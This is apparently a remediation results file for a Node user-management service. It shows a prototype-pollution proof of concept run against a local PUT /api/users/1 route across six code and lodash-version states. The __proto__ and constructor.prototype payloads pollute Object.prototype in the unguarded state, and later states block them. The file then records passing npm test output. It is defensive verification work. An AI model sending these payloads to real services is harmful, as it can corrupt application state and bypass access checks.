# PoC results — prototype-pollution matrix

**What this shows:** the saved PoC (`docs/poc/pollute_probe.js`) run against
the `PUT /api/users/1` route in six source/dependency states, both payload forms
each, plus `npm test` on `stage2/final`. `RESULT: POLLUTED` means a fresh `{}`
saw the injected marker (global `Object.prototype` polluted).

**Produced on branch:** stage2/final (tip c545cc4)
**Date:** 2026-11-01T20:01:57+02:00
**Harness:** each state is a detached `git worktree`; `node_modules` is a hardlink
copy pinned to lodash 4.17.4 or 4.17.21. All HTTP traffic is to 127.0.0.1 only.

**Exact command per run:**
```
node docs/poc/pollute_probe.js <worktree>/src/index.js <proto|ctor>
```
`<worktree>` is a placeholder for each per-state detached worktree directory
(created under a local scratchpad path, abstracted here); the path segment after
it (`base/`, `guardA/`, …) names the state from the list below.

States and their commits:
- base   = 31d8090 (lodash 4.17.4, no guards)
- guardA = d34fa3c (lodash 4.17.4, allow-list route only)
- guardB = bc9ba8f with src/routes/users.js restored to 31d8090 (lodash 4.17.4, vulnerable _.merge + middleware only)
- both   = bc9ba8f (lodash 4.17.4, allow-list route + middleware)
- deps   = 112b181 / stage2/deps-and-workflow (lodash 4.17.21, no guards)
- final  = c545cc4 / stage2/final (lodash 4.17.21, allow-list route + middleware)

---

## state=base  form=proto
```
$ node docs/poc/pollute_probe.js <worktree>/base/src/index.js proto
2026-11-01 20:01:57 - PUT /api/users/1
FORM           : proto
payload        : {"username":{"__proto__":{"polluted_proto":true}}}
HTTP status    : 200
response body  : {"success":true,"data":{"id":1,"username":{},"email":"admin@example.com","createdAt":"2026-10-02T17:01:57.386Z","updatedAt":"2026-11-01T18:01:57.422Z"},"message":"User updated successfully","timestamp
({})[polluted_proto] : true
own marker?    : false
RESULT         : POLLUTED
```

## state=base  form=ctor
```
$ node docs/poc/pollute_probe.js <worktree>/base/src/index.js ctor
2026-11-01 20:01:57 - PUT /api/users/1
FORM           : ctor
payload        : {"username":{"constructor":{"prototype":{"polluted_ctor":true}}}}
HTTP status    : 200
response body  : {"success":true,"data":{"id":1,"username":{},"email":"admin@example.com","createdAt":"2026-10-02T17:01:57.663Z","updatedAt":"2026-11-01T18:01:57.700Z"},"message":"User updated successfully","timestamp
({})[polluted_ctor] : true
own marker?    : false
RESULT         : POLLUTED
```

## state=guardA  form=proto
```
$ node docs/poc/pollute_probe.js <worktree>/guardA/src/index.js proto
2026-11-01 20:01:57 - PUT /api/users/1
FORM           : proto
payload        : {"username":{"__proto__":{"polluted_proto":true}}}
HTTP status    : 400
response body  : {"success":false,"error":"username must be a string","timestamp":"2026-11-01T18:01:57.994Z"}
({})[polluted_proto] : undefined
own marker?    : false
RESULT         : not polluted
```

## state=guardA  form=ctor
```
$ node docs/poc/pollute_probe.js <worktree>/guardA/src/index.js ctor
2026-11-01 20:01:58 - PUT /api/users/1
FORM           : ctor
payload        : {"username":{"constructor":{"prototype":{"polluted_ctor":true}}}}
HTTP status    : 400
response body  : {"success":false,"error":"username must be a string","timestamp":"2026-11-01T18:01:58.283Z"}
({})[polluted_ctor] : undefined
own marker?    : false
RESULT         : not polluted
```

## state=guardB  form=proto
```
$ node docs/poc/pollute_probe.js <worktree>/guardB/src/index.js proto
FORM           : proto
payload        : {"username":{"__proto__":{"polluted_proto":true}}}
HTTP status    : 400
response body  : {"success":false,"error":"Request body contains a forbidden key (__proto__, constructor, or prototype)","timestamp":"2026-11-01T18:01:58.560Z"}
({})[polluted_proto] : undefined
own marker?    : false
RESULT         : not polluted
```

## state=guardB  form=ctor
```
$ node docs/poc/pollute_probe.js <worktree>/guardB/src/index.js ctor
FORM           : ctor
payload        : {"username":{"constructor":{"prototype":{"polluted_ctor":true}}}}
HTTP status    : 400
response body  : {"success":false,"error":"Request body contains a forbidden key (__proto__, constructor, or prototype)","timestamp":"2026-11-01T18:01:58.854Z"}
({})[polluted_ctor] : undefined
own marker?    : false
RESULT         : not polluted
```

## state=both  form=proto
```
$ node docs/poc/pollute_probe.js <worktree>/both/src/index.js proto
FORM           : proto
payload        : {"username":{"__proto__":{"polluted_proto":true}}}
HTTP status    : 400
response body  : {"success":false,"error":"Request body contains a forbidden key (__proto__, constructor, or prototype)","timestamp":"2026-11-01T18:01:59.139Z"}
({})[polluted_proto] : undefined
own marker?    : false
RESULT         : not polluted
```

## state=both  form=ctor
```
$ node docs/poc/pollute_probe.js <worktree>/both/src/index.js ctor
FORM           : ctor
payload        : {"username":{"constructor":{"prototype":{"polluted_ctor":true}}}}
HTTP status    : 400
response body  : {"success":false,"error":"Request body contains a forbidden key (__proto__, constructor, or prototype)","timestamp":"2026-11-01T18:01:59.418Z"}
({})[polluted_ctor] : undefined
own marker?    : false
RESULT         : not polluted
```

## state=deps  form=proto
```
$ node docs/poc/pollute_probe.js <worktree>/deps/src/index.js proto
2026-11-01 20:01:59 - PUT /api/users/1
FORM           : proto
payload        : {"username":{"__proto__":{"polluted_proto":true}}}
HTTP status    : 200
response body  : {"success":true,"data":{"id":1,"username":{},"email":"admin@example.com","createdAt":"2026-10-02T17:01:59.658Z","updatedAt":"2026-11-01T18:01:59.695Z"},"message":"User updated successfully","timestamp
({})[polluted_proto] : undefined
own marker?    : false
RESULT         : not polluted
```

## state=deps  form=ctor
```
$ node docs/poc/pollute_probe.js <worktree>/deps/src/index.js ctor
2026-11-01 20:01:59 - PUT /api/users/1
FORM           : ctor
payload        : {"username":{"constructor":{"prototype":{"polluted_ctor":true}}}}
HTTP status    : 200
response body  : {"success":true,"data":{"id":1,"username":{"constructor":{"prototype":{"polluted_ctor":true}}},"email":"admin@example.com","createdAt":"2026-10-02T17:01:59.935Z","updatedAt":"2026-11-01T18:01:59.979Z"
({})[polluted_ctor] : undefined
own marker?    : false
RESULT         : not polluted
```

## state=final  form=proto
```
$ node docs/poc/pollute_probe.js <worktree>/final/src/index.js proto
FORM           : proto
payload        : {"username":{"__proto__":{"polluted_proto":true}}}
HTTP status    : 400
response body  : {"success":false,"error":"Request body contains a forbidden key (__proto__, constructor, or prototype)","timestamp":"2026-11-01T18:02:00.291Z"}
({})[polluted_proto] : undefined
own marker?    : false
RESULT         : not polluted
```

## state=final  form=ctor
```
$ node docs/poc/pollute_probe.js <worktree>/final/src/index.js ctor
FORM           : ctor
payload        : {"username":{"constructor":{"prototype":{"polluted_ctor":true}}}}
HTTP status    : 400
response body  : {"success":false,"error":"Request body contains a forbidden key (__proto__, constructor, or prototype)","timestamp":"2026-11-01T18:02:00.568Z"}
({})[polluted_ctor] : undefined
own marker?    : false
RESULT         : not polluted
```

---

## npm test on stage2/final
**Branch/commit:** stage2/final (c545cc4) | lodash 4.17.21
**Date:** 2026-11-01T20:02:09+02:00
**Command:** `npm test`
**Note:** the un-mocked `External Data` test makes one outbound HTTPS call to jsonplaceholder.typicode.com (pre-existing test behavior; approved by the user for this run). All PoC traffic above is 127.0.0.1 only.
```

> user-management-service@1.0.0 test
> jest

  console.log
    2026-11-01 20:02:10 - GET /health

      at log (src/index.js:24:11)

  console.log
    2026-11-01 20:02:10 - GET /api/users

      at log (src/index.js:24:11)

  console.log
    2026-11-01 20:02:10 - GET /api/users/1

      at log (src/index.js:24:11)

  console.log
    2026-11-01 20:02:10 - GET /api/users/999

      at log (src/index.js:24:11)

  console.log
    2026-11-01 20:02:10 - POST /api/users

      at log (src/index.js:24:11)

  console.log
    2026-11-01 20:02:11 - POST /api/users

      at log (src/index.js:24:11)

  console.log
    2026-11-01 20:02:11 - POST /api/auth/login

      at log (src/index.js:24:11)

  console.log
    2026-11-01 20:02:11 - POST /api/auth/login

      at log (src/index.js:24:11)

  console.log
    2026-11-01 20:02:11 - GET /api/external-data

      at log (src/index.js:24:11)

PASS src/test/app.test.js
  User Management Service
    Health Check
      ✓ should return healthy status (65 ms)
    Users API
      ✓ should get all users (11 ms)
      ✓ should get user by ID (9 ms)
      ✓ should return 404 for non-existent user (8 ms)
      ✓ should create a new user (20 ms)
      ✓ should validate required fields when creating user (28 ms)
    Authentication
      ✓ should login with valid credentials (115 ms)
      ✓ should reject login without credentials (8 ms)
    External Data
      ✓ should fetch external data (113 ms)

Test Suites: 1 passed, 1 total
Tests:       9 passed, 9 total
Snapshots:   0 total
Time:        1.154 s, estimated 2 s
Ran all test suites.
```
